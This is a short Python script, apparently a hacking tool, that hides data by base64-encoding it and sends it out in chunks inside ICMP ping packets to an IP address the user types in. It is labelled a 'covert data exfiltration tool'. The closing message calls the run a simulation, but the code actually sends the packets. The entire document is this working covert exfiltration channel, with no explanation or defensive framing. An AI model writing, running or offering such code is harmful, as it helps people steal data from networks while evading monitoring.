from scapy.all import IP, ICMP, send
import base64

print("ICMP Covert Data Exfiltration Tool\n")

target = input("Enter target IP: ")
data = input("Enter data to exfiltrate: ")

# Encode data to hide it
encoded = base64.b64encode(data.encode()).decode()

print("\n[*] Sending data via ICMP packets...\n")

chunk_size = 16
chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

for i, chunk in enumerate(chunks):
    packet = IP(dst=target)/ICMP()/chunk
    send(packet, verbose=0)
    print(f"[+] Sent chunk {i+1}: {chunk}")

print("\n[!] Data exfiltration simulation complete")
